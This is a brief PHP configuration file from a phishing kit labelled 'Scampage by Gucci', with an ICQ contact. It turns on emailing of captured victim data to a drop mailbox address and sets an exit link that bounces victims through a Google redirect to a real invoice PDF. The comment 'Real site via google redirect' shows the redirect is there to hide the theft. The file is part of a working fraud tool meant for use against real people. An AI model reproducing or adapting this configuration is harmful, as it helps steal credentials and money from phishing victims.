<?php
/*
 * Scampage by Gucci
 * ICQ: 713566330
 */


$saveFile = 0;
$sendEmail = 1;


$to = "trojan67@protonmail.com";
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=9&cad=rja&uact=8&ved=2ahUKEwjEwLvnprriAhXBRBUIHQ5IBVEQFjAIegQIABAC&url=https%3A%2F%2Fslicedinvoices.com%2Fpdf%2Fwordpress-pdf-invoice-plugin-sample.pdf&usg=AOvVaw3LuLujg7LXhoXgwlL1dS4o"; // Real site via google redirect

?>